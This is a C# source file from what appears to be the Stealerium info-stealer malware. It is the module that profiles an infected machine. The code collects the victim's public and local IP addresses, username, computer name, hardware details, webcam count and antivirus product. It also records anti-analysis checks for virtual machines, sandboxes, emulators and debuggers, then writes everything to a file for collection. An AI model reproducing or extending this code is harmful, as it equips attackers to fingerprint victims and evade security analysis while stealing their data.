using System;
using System.IO;
using Stealerium.Helpers;
using Stealerium.Modules.Implant;

namespace Stealerium.Target.System
{
    internal sealed class SysInfo
    {
        public static void Save(string sSavePath)
        {
            try
            {
                var systemInfoText = ""
                                     + "\n[IP]"
                                     + "\nExternal IP: " + SystemInfo.GetPublicIp()
                                     + "\nInternal IP: " + SystemInfo.GetLocalIp()
                                     + "\nGateway IP: " + SystemInfo.GetDefaultGateway()
                                     + "\n"
                                     + "\n[Machine]"
                                     + "\nUsername: " + SystemInfo.Username
                                     + "\nCompname: " + SystemInfo.Compname
                                     + "\nSystem: " + SystemInfo.GetSystemVersion()
                                     + "\nCPU: " + SystemInfo.GetCpuName()
                                     + "\nGPU: " + SystemInfo.GetGpuName()
                                     + "\nRAM: " + SystemInfo.GetRamAmount()
                                     + "\nDATE: " + SystemInfo.Datenow
                                     + "\nSCREEN: " + SystemInfo.ScreenMetrics()
                                     + "\nBATTERY: " + SystemInfo.GetBattery()
                                     + "\nWEBCAMS COUNT: " + WebcamScreenshot.GetConnectedCamerasCount()
                                     + "\n"
                                     + "\n[Virtualization]"
                                     + "\nVirtualMachine: " + AntiAnalysis.VirtualBox()
                                     + "\nSandBoxie: " + AntiAnalysis.SandBox()
                                     + "\nEmulator: " + AntiAnalysis.Emulator()
                                     + "\nDebugger: " + AntiAnalysis.Debugger()
                                     + "\nProcesse: " + AntiAnalysis.Processes()
                                     + "\nHosting: " + AntiAnalysis.Hosting()
                                     + "\nAntivirus: " + SystemInfo.GetAntivirus()
                                     + "\n";
                File.WriteAllText(sSavePath, systemInfoText);
            }
            catch (Exception ex)
            {
                Logging.Log("SysInfo >> Failed fetch system info\n" + ex);
            }
        }
    }
}